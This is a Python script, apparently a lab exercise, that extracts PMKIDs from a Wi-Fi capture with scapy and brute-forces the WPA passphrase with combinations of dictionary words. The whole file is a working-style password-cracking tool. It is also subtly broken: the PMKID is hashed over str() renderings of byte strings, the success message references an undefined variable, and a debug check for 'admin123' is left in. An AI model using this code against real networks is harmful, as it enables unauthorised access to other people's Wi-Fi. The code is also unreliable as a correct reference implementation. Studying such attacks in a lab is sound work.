#!/usr/bin/env python
# -*- coding: utf-8 -*-

from scapy.all import *
from binascii import a2b_hex, b2a_hex
# from pbkdf2_math import pbkdf2_hex
from pbkdf2 import *
import hmac, hashlib

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap('PMKID_handshake.pcap') 

# Transform mac from string with semicolon to binary string
def normalizeMac(mac):
    return a2b_hex(mac.replace(":", ""))

# Return an array of SSIDs found in packets. 
def findSSID(packets, apmac):
    for packet in packets: 
        # The SSID is advertized in Beacons
        if Dot11Beacon in packet and Dot11Elt in packet[Dot11Beacon] and normalizeMac(packet.addr2) == apmac:
            #print(normalizeMac(packet.addr2))
            #print(apmac)

            packet = packet[Dot11Beacon]
            packet = packet[Dot11Elt]
            if packet.ID == 0: # SSID
                return packet.info.decode()

def findPMKIDs(packets):
    PMKIDs = {}

    for packet in packets:
        if packet.haslayer(EAPOL):
            # Tuple with PMKID, Client MAC, AP MAC
            #print(packet.addr1, packet.addr2)
            PMKIDs[normalizeMac(packet.addr2)] = (packet[Raw].load[-16:], normalizeMac(packet.addr1))
            #PMKIDs[packet[Raw].load[-16:]] = (normalizeMac(packet.addr1), normalizeMac(packet.addr2))

    return PMKIDs

def wordCombinations(words, n):
    return list(itertools.combinations(words, n))

def PMKID(key, ssid, staMAC, apMAC):
    key = pbkdf2(hashlib.sha1, key, ssid, 4096, 32)
    return hmac.new(key,str.encode('PMK Name'+str(apMAC)+str(staMAC)),hashlib.sha1).digest()[:16]

print(findPMKIDs(wpa))

import itertools
# Read dictionnary words
#words = open('wordlist.txt', 'r').readlines()
words = [line.rstrip() for line in open('wordlist.txt', 'r')]

# Max combinations of words
maxc = int(input("Enter maximum words combinations [Int]: "))

APs = findPMKIDs(wpa)

for ap in APs:
    ssid = findSSID(wpa, ap)
            
    if ssid == None: # Not an AP
        continue

    for i in range(1, maxc+1):
        for key in wordCombinations(words, i):
            pmkid, stamac = APs[ap]
            
            #print(key)
            #print(str.encode(''.join(key)))
            #print(str.encode(ssid))
            if 'admin123' in ''.join(key):
                print(ssid)
                print(''.join(key))
                print(PMKID(str.encode(''.join(key)), str.encode(ssid), stamac, ap))
                print(pmkid)

            if pmkid == PMKID(str.encode(''.join(key)), str.encode(ssid), stamac, ap):
                print("Found passphrase ", word, " for AP ", ssid)
                break
            
